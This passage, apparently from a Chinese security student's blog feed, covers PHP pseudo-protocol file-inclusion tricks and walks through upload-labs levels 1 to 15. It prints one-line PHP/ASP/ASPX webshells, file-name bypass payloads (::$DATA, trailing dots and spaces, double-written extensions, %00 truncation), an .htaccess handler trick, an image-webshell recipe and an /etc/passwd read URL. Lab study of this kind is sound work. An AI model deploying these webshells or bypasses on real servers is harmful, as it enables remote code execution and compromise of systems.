class="line">2、data://text/plain;base64,</span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAlMjBwaHBpbmZvKCk7Pz4=</span><br></pre></td></tr></table></figure><p><strong>范例</strong><br>#1 打印 data:&#x2F;&#x2F; 的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 打印 &quot;I love PHP&quot;</span><br><span class="line">echo  file_get_contents ( &#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27; );</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h1><p>allow_url_fopen off&#x2F;on<br>allow_url_include off&#x2F;on<br>用于访问本地文件系统<br>file:&#x2F;&#x2F;协议主要用于访问文件(绝对路径、相对路径以及网络路径)<br>比如：<code>http://www.xx.com?file=file:///etc/passsword</code></p><h1 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h1><p>allow_url_fopen off&#x2F;on<br>allow_url_include on<br>php:&#x2F;&#x2F;input允许开发者从请求体中获取原始的 POST 数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eg：</span><br><span class="line">http://127.0.0.1/cmd.php?cmd=php://input</span><br><span class="line">POST数据：&lt;?php phpinfo()?&gt;</span><br></pre></td></tr></table></figure><p>PHP file_get_contents() 函数：把整个文件读入一个字符串中</p><h2 id="注意：碰到file-get-contents-就要想到用php-input绕过"><a href="#注意：碰到file-get-contents-就要想到用php-input绕过" class="headerlink" title="注意：碰到file_get_contents()就要想到用php:&#x2F;&#x2F;input绕过"></a>注意：碰到file_get_contents()就要想到用php:&#x2F;&#x2F;input绕过</h2><p>碰到file_get_contents()就要想到用php:&#x2F;&#x2F;input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据。file_get_contents()：这个函数就是把一个文件里面的东西 （字符）全部return出来作为字符串。除此之外，通过实践我发现这个函数如果直接把字符串当作参数会报错，但如果包含的是http协议的网址，则会像curl命令一样，把源码读出来。而php伪协议也是识别http协议的，所以说上面php:&#x2F;&#x2F;input可以将POST的数据读过来来赋值给参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo file_get_contents(&quot;php://input&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>php:&#x2F;&#x2F;input（写入木马）:<br>这里有些不理解<br>学习网址：<a href="https://blog.csdn.net/qq_51524329/article/details/121439731">https://blog.csdn.net/qq_51524329/article/details/121439731</a></p><p>​         </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式</title>
      <link href="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html"/>
      <url>/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>upload</title>
      <link href="/upload.html"/>
      <url>/upload.html</url>
      
        <content type="html"><![CDATA[<h2 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h2><p>文件上传漏洞是指文件上传功能没有对上传的文件做合理严谨的过滤，导致用户可以利用此功能，上传能被服务端解析执行的文件，并通过此文件获得执行服务端命令的能力。</p><h2 id="WebShell是什么"><a href="#WebShell是什么" class="headerlink" title="WebShell是什么"></a>WebShell是什么</h2><ul><li>WebShell , 简称网页后门。简单来说它是运行在Web应用之上的远程控制程序</li><li>webShell其实就是一张网页，但webShell并不具备常见网页的功能，例如登录、注册、信息展示等功能，一般会具备文件管理、端口扫描、提权、获取系统信息等功能。</li></ul><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php的一句话木马： &lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;</span><br><span class="line">asp的一句话是：   &lt;%eval request (&quot;attack&quot;)%&gt;</span><br><span class="line">aspx的一句话是：  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;attack&quot;],&quot;unsafe&quot;);%&gt;</span><br><span class="line">phtml格式:GIF89a  //习惯在文件前加上GIF89a来绕过PHP getimagesize的检查</span><br><span class="line">&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="line">&lt;script language=&#x27;php&#x27;&gt;system(&#x27;cat /flag&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="php一句话木马的解释"><a href="#php一句话木马的解释" class="headerlink" title="php一句话木马的解释"></a>php一句话木马的解释</h3><p>1、php的代码要写在<?php ?>里面，服务器才能认出来这是php代码，然后才去解析<br>2、@符号的意思是不报错，即使执行错误，也不报错<br>为什么呢？因为一个变量没有定义，就被拿去使用了，服务器就善意的提醒：Notice，你的xxx变量没有定义。这不就暴露了密码吗？所以我们加上@<br>3、$_POST[‘a’];的意思就是a这个变量，用post的方法接收<br>4、eval()把字符串作为PHP代码执行</p><ul><li>连起来意思就是：用post方法接收变量pw，把变量pw里面的字符串当做php代码来执行</li></ul><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p><strong>Javascript 前端检查</strong><br>一般都是通过 JS 限制上传的文件类型，对于这种情况，我们可以采用以下几种方式绕过:<br>1、上传png后缀的一句话木马，代理抓包，修改上传的文件后缀<br>2、修改JS文件（推荐）<br>3、禁用js<br>$_FILES中的那些参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$_FILES这个变量用与上传的文件参数设置，是一个多维数组</span><br><span class="line">数组的用法就是 $_FILES[&#x27;key&#x27;][&#x27;key2&#x27;];</span><br><span class="line">$_FILES[&#x27;upfile&#x27;]是你表单上传的文件信息数组，upfile是文件上传字段，在上传时由服务器根据上传字段设定。</span><br><span class="line"></span><br><span class="line">$_FILES[&#x27;upfile&#x27;]包含了以下内容:</span><br><span class="line">$_FILES[&#x27;upfile&#x27;][&#x27;name&#x27;] 客户端文件的原名称。</span><br><span class="line">$_FILES[&#x27;upfile&#x27;][&#x27;type&#x27;] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image/gif&quot;。</span><br><span class="line">$_FILES[&#x27;upfile&#x27;][&#x27;size&#x27;] 已上传文件的大小，单位为字节。</span><br><span class="line">$_FILES[&#x27;upfile&#x27;][&#x27;tmp_name&#x27;] 文件被上传后在服务端储存的临时文件名。</span><br><span class="line">$_FILES[&#x27;upfile&#x27;][&#x27;error&#x27;] 和该文件上传相关的错误代码。</span><br></pre></td></tr></table></figure><p>源码中的js代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    function checkFile() &#123;</span><br><span class="line">        var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value;</span><br><span class="line">        if (file == null || file == &quot;&quot;) &#123;</span><br><span class="line">            alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        //定义允许上传的文件类型</span><br><span class="line">        var allow_ext = &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">        //提取上传文件的类型</span><br><span class="line">        var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">        //判断上传文件类型是否允许上传</span><br><span class="line">        if (allow_ext.indexOf(ext_name) == -1) &#123;</span><br><span class="line">            var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">            alert(errMsg);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>alert()<br>作用：在浏览器中弹出一个警示框，警示框的警示内容可以人为自定义<br>alert 语句是一个 js 内置好的功能（函数、方法），要想实现功能必须在 alert 关键字后面 加小括号执行，自定义的内容需要传递给小括号内的参数，输出时参数位置的内容<code>alert(&quot;请选择要上传的文件!&quot;);</code>会出现 在弹框位置<br>通关思路：<br>f12-&gt;查看器-&gt;找到调用检验函数语句<br><img src="/./img/139.png"><br>将onsubmit&#x3D;”return checkFile()”删去即可提交</li></ul><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>本题要求对数据包中的<strong>MIME</strong>进行检查<br>MIME是什么？<br>简单来说就是文件的后缀<br>在HTTP中，MIME类型被定义在Content-Type header中<br>常见的类型如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">超文本标记语言文本 .html text/html</span><br><span class="line">PDF文档 .pdf application/pdf</span><br><span class="line">PNG图像 .png image/png</span><br><span class="line">JPEG图形 .jpeg,.jpg image/jpeg</span><br></pre></td></tr></table></figure><p>源码中从这里可以看出是对MIME的检验：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;))</span><br></pre></td></tr></table></figure><ul><li>pass：<br>1、抓包后找到MIMIE的位置，在Content-Type中<br><img src="/./img/140.png"><br>更改其为image&#x2F;jpeg，放包即可上传<br>2、用正确形式上传，再在bp上改成php格式</li></ul><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p><strong>黑名单验证</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //收尾去空</span><br></pre></td></tr></table></figure><ul><li>trim()函数是用来清除文本首尾多余的空格以及文本中的重复空格</li><li>strrchr() 函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符<br>strrchr(string,char)<br>string:被搜索的字符串<br>char:要查找的字符。如果该参数是数字，则搜索匹配数字 ASCII 值的字符<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo strrchr(&quot;Hello world!&quot;,111);</span><br><span class="line">?&gt;</span><br><span class="line">运行结果：orld! </span><br></pre></td></tr></table></figure></li><li><code>::$DATA</code>：在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名<br>eg:”phpinfo.php::$DATA”Windows会自动去掉末尾的::$DATA变成”phpinfo.php”</li><li>pass：上传的后缀名只要不在那几个之间，可以使用<br>PHP：php4&#x2F;php5&#x2F;phtml&#x2F;php3&#x2F;pht<br>当我们不知道什么被加入黑名单的话，我们还能用bp爆破一下</li></ul><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p><strong>htaccess文件利用</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //收尾去空</span><br></pre></td></tr></table></figure><ul><li>概念：htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</li><li>.htaccess文件内容：<code>SetHandler application/x-httpd-php</code><br>设置当前目录所有文件都使用PHP解析，那么无论上传任何文件，只要文件内容符合PHP语言代码规范，就会被当作PHP执行。不符合则报错。<br>指定文件：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;文件名&quot;&gt;</span><br><span class="line">setHandler application/x-httpd-php  </span><br><span class="line">&lt;/FilesMatch&gt; </span><br></pre></td></tr></table></figure></li><li>pass：1、新建.txt文件，输入SetHandler application&#x2F;x-httpd-php,修改后缀为.htaccess,上传<br>再建立一个txt文件，写上一句话木马，改成它允许的格式（eg：png），上传即可<br>2、将文件后缀名改为”点+空格+点”的格式，这样file_ext会变为空，成功绕过黑名单上传。Windows会自动删除文件名最后的点，最后变为1.php<br><code>Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;1.php. .&quot;</code></li><li>.htaccess利用防范：黑名单限制</li></ul><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>过滤了.htaccess，但是$file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点，仍然只过滤了一次点，所以使用. .绕过</p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>代码中未用strtolower()把文件后缀名变为小写，使用大小写绕过</p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>代码中未用trim()去除首尾空格，截包时文件名后加空格绕过即可,这样即是.php后缀又不会被黑名单过滤<br><code>Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;1.php  &quot;</code></p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>代码中未用deldot()去除点，使用BurpSuite截包，文件名后加点绕过即可<br><code>Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php.&quot;</code></p><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p>代码中未用str_ireplace()过滤::$DATA数据流标记，在BurpSuite中加入::$DATA到文件名末尾即可。在访问时去掉URL中的::$DATA<br><code>Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php::$DATA&quot;</code></p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>“点+空格+点”过滤</p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br><span class="line">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">        $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;        </span><br><span class="line">        if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code>将出现在黑名单中的后缀名替换成空白字符串，但无论文件名是否被匹配都会被上传。鉴于源代码中只过滤了一次，我们可以使用双写绕过方法上传（如：.jjspsp）。这样str_ireplace()函数会将字符串”jsp”替换为空白，但替换后剩下的字符串刚好为”.jsp”</p><ul><li>pass:文件名为“shell.pphphp”，直接上传即可</li></ul><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p><strong>%00截断漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">    $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">        $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else&#123;</span><br><span class="line">        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>in_array():搜索数组中是否存在指定的值</li><li>strrpos():查找字符串在另一字符串中最后一次出现的位置（区分大小写）</li><li>substr():返回字符串的一部分<br>这里<code>strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)</code>就是找到.最后一次出现的位置，+1使刚好取到.,那么substr取到的就是文件后缀,所以这里后缀被强行规定了</li></ul><h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>ps:适用于php版本&lt;5.3.4,且服务中器的php.ini中的magic_quotes_gpc &#x3D; Off，才可以进行%00截断<br>原理：php的一些函数的底层是C语言，而move_uploaded_file就是其中之一，遇到0x00会截断，0x表示16进制，URL中%00解码成16进制就是0x00.<br>补充：1、C语言标准库中对字符串的处理都会以\0作为字符串结束标志，任何字符串之后都会自动加上’\0’。’\0’的意思是 ASCII 码为 0 的字符，对应的字符是（Null），表示字符串结束符<br>2、magic_quotes_gpc 着重偏向数据库方面，是为了防止sql注入，但magic_quotes_gpc开启还会对<code>$_REQUEST, $_GET,$_POST,$_COOKIE </code>输入的内容进行过滤</p><p>pass：上传路径是可控的<code>$_GET[&#39;save_path&#39;]</code>，后面还有一个后缀名需要绕过,并且是以拼接的形式<br><img src="/./img/141.png"></p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>查看源代码，和第十一关对比，发现接受值变成了post，那么思路就和第十一关一样，不过post方式不会自行解码，所以要对%00进行urldecode<br>burp可以进行快捷编码，选中%00右键convert selection即可进行快速url编码<br><img src="/./img/142.png"><br>也可以这样<br><img src="/./img/143.png"><br><img src="/./img/144.png"><br>把6的ascii改成00<br><img src="/./img/145.png"></p><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p><strong>上传图片马</strong><br>PHP版本&gt;5.3  必须在php.ini中开启allow_url_fopen选项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function getReailFileType($filename)&#123;</span><br><span class="line">    $file = fopen($filename, &quot;rb&quot;);</span><br><span class="line">    $bin = fread($file, 2); //只读2字节</span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(&quot;C2chars&quot;, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]);    </span><br><span class="line">    $fileType = &#x27;&#x27;;    </span><br><span class="line">    switch($typeCode)&#123;      </span><br><span class="line">        case 255216:            </span><br><span class="line">            $fileType = &#x27;jpg&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        case 13780:            </span><br><span class="line">            $fileType = &#x27;png&#x27;;</span><br><span class="line">            break;        </span><br><span class="line">        case 7173:            </span><br><span class="line">            $fileType = &#x27;gif&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        default:            </span><br><span class="line">            $fileType = &#x27;unknown&#x27;;</span><br><span class="line">        &#125;    </span><br><span class="line">        return $fileType;</span><br></pre></td></tr></table></figure><p>$file &#x3D; fopen($filename, “rb”);是以二进制读取模式打开文件<br>$strInfo &#x3D; @unpack(“C2chars”, $bin);这里是解包（用什么打包就用什么解包），然后以二进制输出<br>intval()对结果进行十进制转换，该函数会返回变量对应的integer数值<br>这里只会读取判断上传文件的前两个字节，即判断上传文件类型</p><ul><li>制作图片马<br>1、利用cmd制作<br><code>copy 1.php/b+1.jpg/a 2.jpg</code><br>2、利用Notepad++直接在末尾加上一句话<br>效果：<br><img src="/./img/146.png"></li><li>pass：将图片马上传，打开include界面，并get传参<br><code>http://127.0.0.1/upload-labs-master/include.php?file=upload/6920230523120607.jpg</code><br>文件包含把文件强制当成php文件解析，所以可以直接用蚁剑连接</li></ul><h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p>1、文件包含：服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行<br>2、文件包含函数<br>PHP中文件包含函数有以下四种：</p><ul><li>include()</li><li>include_once()</li><li>require()</li><li>require_once()<br><strong>这四个函数的对比</strong><br>1、include在引入不存文件时产生一个警告且脚本还会继续执行，require则会导致一个致命性错误且脚本停止执行。<br>2、include_once,require_once函数的作用与include相同，不过它会首先验证是否已包含该文件。如果已经包含，则不再执行。<br>3、漏洞产生原因<br>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。<br>eg：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line">if(isset($file))&#123;</span><br><span class="line">    include $file; </span><br></pre></td></tr></table></figure><code>$_GET[‘file’]</code>参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改<code>$_GET[‘file’]</code>的值，执行非预期的操作。</li></ul><p>后台使用包含函数include()处理文件中的代码时，如果发生错误，也会继续往下执行。也就是说，虽然前面的图片代码无法执行，但是最后的php代码是可以被执行的</p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p><strong>getimagesize图片马</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function isImage($filename)&#123;</span><br><span class="line">    $types = &#x27;.jpeg|.png|.gif&#x27;;</span><br><span class="line">    if(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[2]);</span><br><span class="line">        if(stripos($types,$ext))&#123;</span><br><span class="line">            return 